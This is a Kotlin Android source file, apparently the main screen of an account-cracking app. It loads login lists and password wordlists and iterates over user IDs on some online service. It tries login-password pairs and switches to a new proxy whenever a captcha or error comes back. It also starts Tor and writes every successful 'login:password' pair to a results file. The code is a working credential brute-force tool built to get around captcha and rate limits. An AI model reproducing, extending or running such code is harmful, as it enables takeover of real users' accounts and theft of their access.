package com.disak.zaebali.ui

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.Observer
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.lifecycleScope
import com.disak.zaebali.LOG_SIZE
import com.disak.zaebali.R
import com.disak.zaebali.extensions.toast
import com.disak.zaebali.models.Result
import com.disak.zaebali.net.*
import com.disak.zaebali.repository.ResourceProvider
import com.disak.zaebali.utils.FilePicker
import com.disak.zaebali.utils.PermissionChecker
import com.disak.zaebali.utils.TorProgressTask
import com.jaiselrahman.filepicker.model.MediaFile
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

val REQUIRED_PERMISSIONS =
    arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE)

class MainActivity : AppCompatActivity(), PermissionChecker.PermissionCheckerListener {
    private val permissionChecker = PermissionChecker(this, this)
    private val filePicker = FilePicker()
    private lateinit var mainViewModel: MainViewModel

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        mainViewModel =
            ViewModelProvider(this, MainViewModel.FACTORY.invoke(ResourceProvider(this))).get(
                MainViewModel::class.java
            )

        subscribeLiveData()

        btnStart.setOnClickListener {
            if (mainViewModel.isProgress.value != true) begin()
            else stop()
        }

        permissionChecker.requestPermissions(REQUIRED_PERMISSIONS)

        customLogin.setOnClickListener {
            filePicker.pickFile(this, object : FilePicker.FilePickerListener {
                override fun onFilePick(file: MediaFile) {
                    lifecycleScope.launch {
                        val text =
                            contentResolver.openInputStream(file.uri)?.bufferedReader()?.use { it.readText() }
                                ?: ""
                        val loginList =
                            text.split("\n").filter { it.isNotBlank() }.map { it.trim() }

                        mainViewModel.loginList = loginList.toMutableList()

                        updateCustomLoginButton()
                    }
                }

            })
        }

        passwords.setOnClickListener {
            filePicker.pickFile(this, object : FilePicker.FilePickerListener {
                override fun onFilePick(file: MediaFile) {
                    lifecycleScope.launch {
                        val text =
                            contentResolver.openInputStream(file.uri)?.bufferedReader()?.use { it.readText() }
                                ?: ""
                        val passwords =
                            text.split("\n").filter { it.isNotBlank() }.map { it.trim() }

                        mainViewModel.passwords = passwords.toMutableList()

                        updatePasswordsButton()
                    }
                }

            })
        }

        results.setOnClickListener {
            filePicker.pickFile(this, object : FilePicker.FilePickerListener {
                override fun onFilePick(file: MediaFile) {
                    mainViewModel.targetName = file.name

                    updateResultButton()
                }
            })
        }

        updateCustomLoginButton()
        updatePasswordsButton()
        updateResultButton()

        TorProgressTask(this@MainActivity).execute()
    }

    private fun updateCustomLoginButton() {
        customLogin.text = getString(R.string.load_login, mainViewModel.loginList.size)
    }

    private fun updatePasswordsButton() {
        passwords.text = getString(R.string.passwords, mainViewModel.passwords.size)
    }

    private fun updateResultButton() {
        val name =
            if (mainViewModel.targetName != null) mainViewModel.targetName else getString(R.string.not_set)
        results.text = getString(R.string.save_to, name)
    }

    private fun updateButton() {
        if (mainViewModel.isProgress.value == true) {
            btnStart.setText(R.string.stop)
        } else {
            btnStart.setText(R.string.begin)
        }
    }

    private fun begin() {
        val from = startFrom.text.toString().toIntOrNull() ?: 1

        mainViewModel.begin(from)
        log(getString(R.string.start))
    }

    private fun putResults(login: String, password: String) {
        lifecycleScope.launch(Dispatchers.IO) {
            mainViewModel.targetName?.let { targetName ->
                val uri = Uri.parse(targetName)
                val stream = contentResolver.openOutputStream(uri, "wa")
                stream?.use { it.write("$login:$password\n".toByteArray()) }
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        filePicker.onActivityResult(requestCode, resultCode, data)
    }

    private fun stop() {
        mainViewModel.stop()
        log(getString(R.string.stopped))
    }

    private fun subscribeLiveData() {
        mainViewModel.errorLiveData.observe(this, Observer {
            log(it)
            stop()
        })

        mainViewModel.currentUserId.observe(this, Observer {
            startFrom.setText(it.toString())
        })

        mainViewModel.userLiveData.observe(this, Observer {
            when (it) {
                is Result.Success -> {
                    if (it.data.ownerName != null) {
                        mainViewModel.login = it.data.ownerName
                        mainViewModel.removeLoginPassword()
                        if (loginPassword.isChecked) {
                            mainViewModel.addLoginPassword(false)
                        }
                        if (loginPasswordLower.isChecked) {
                            mainViewModel.addLoginPassword(true)
                        }
                        log(getString(R.string.current_user, it.data.ownerName))
                        mainViewModel.beginUser()
                    } else mainViewModel.nextUser()
                }
                else -> mainViewModel.nextUser()
            }
        })

        mainViewModel.authLiveData.observe(this, Observer {
            when (it) {
                is Result.Success -> {
                    when (it.data.code) {
                        CODE_SUCCESS -> {
                            log(getString(R.string.success, it.data.password))
                            putResults(it.data.login, it.data.password)
                            mainViewModel.nextUser()
                        }
                        CODE_WRONG_LOGIN_OR_PASSWORD -> {
                            log(getString(R.string.wrong_password, it.data.password))
                            mainViewModel.nextPassword()
                        }
                        CODE_ERR_WRONG_CAPTCHA_CODE -> {
                            log(getString(R.string.wrong_captcha, it.data.password))
                            mainViewModel.nextProxy()
                        }
                        CODE_ERR_NEED_CAPTCHA -> {
                            log(getString(R.string.need_captcha, it.data.password))
                            mainViewModel.nextProxy()
                        }
                        CODE_ERR_USER_NOT_FOUND -> {
                            log(getString(R.string.user_not_found, it.data.password))
                            mainViewModel.nextUser()
                        }
                        else -> {
                            log(getString(R.string.unknown_error, it.data.password))
                            mainViewModel.nextUser()
                        }
                    }
                }

                is Result.Error -> {
                    log(it.exception.message ?: it.toString())
                    mainViewModel.nextProxy()
                }
            }
        })

        mainViewModel.log.observe(this, Observer {
            log(it)
        })

        mainViewModel.isProgress.observe(this, Observer {
            updateButton()
        })
    }

    override fun onResult(granted: Boolean) {
        if (!granted) toast(R.string.permissions_required)
    }

    private fun log(message: String) {
        log.append(message + "\n")
        var lines = log.text.split("\n")
        if (lines.size > LOG_SIZE) {
            lines = lines.subList(lines.size - LOG_SIZE, lines.size)
        }
        log.text = lines.joinToString("\n")
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        permissionChecker.onPermissionsResult(requestCode, grantResults)
    }
}
